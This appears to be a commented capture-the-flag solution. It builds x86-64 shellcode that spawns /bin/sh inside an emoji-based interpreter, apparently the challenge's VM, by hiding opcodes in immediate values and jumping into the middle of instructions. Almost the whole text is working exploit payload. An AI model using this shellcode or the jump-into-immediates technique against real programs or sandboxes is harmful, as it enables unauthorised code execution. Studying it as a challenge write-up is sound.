# we are going to attempt to build the following instructions using emojis:
# mov eax, 0x68732f2f
# mov ebx, 0x6e69622f
# shl rax, 32
# add rax, rbx
#
# xor esi, esi
# push rsi
# push rax
#
# push rsp
# pop rdi
#
# push byte 59
# pop rax
#
# cdq
# syscall

# first, we use ğŸ’¨(A, 0x68732f2f) to get:
# mov eax, 0x68732f2f ; b8 2f 2f 73 68
ğŸ’¨(A, 1752379183)

# next, ğŸ’¨(B, 0x6e69622f) gets us:
# mov ebx, 0x6e69622f ; bb 2f 62 69 6e
ğŸ’¨(B, 1852400175)

# jmp (ins #2) + 6 bytes forward
ğŸƒ 208
# by jumping to second byte of ğŸ’¨(A, 0x20e0c148), we get:
# shl rax, 32         ; 48 c1 e0 20
ğŸ’¨(B, 551600456)


# jmp (ins #4) + 9
ğŸƒ 57
# by jumping to last byte of ğŸ’¨(A, 0x48484848) followed by ğŸ‘, we get:
# add rax, rbx        ; 48 01 d8
# nop, nop, nop       ; 90 90 90
ğŸ’¨(A, 1212696648)
ğŸ‘(_, 0)


# jmp to (ins #7) + 6
ğŸƒ 213
# by jumping to second byte of ğŸ’¨(A, 0x5056f631), we get:
# xor esi, esi        ; 31 f6
# push rsi            ; 56
# push rax            ; 50
ğŸ’¨(A, 1347876401)

# jmp to (ins #9) + 6
ğŸƒ 215
# by jumping to second byte of ğŸ’¨(A, 0x3b6af554), we get:
# push rsp            ; 54
# pop rdi             ; 5f
# push byte 59        ; 6a 3b
ğŸ’¨(A, 996826964)

# jmp to (ins #11) + 6
ğŸƒ 217
# by jumping to second byte of ğŸ’¨(A, 0x050f9958), we get:
# pop rax             ; 58
# cdq                 ; 99
# syscall             ; 0f 05
ğŸ’¨(A, 84908376)
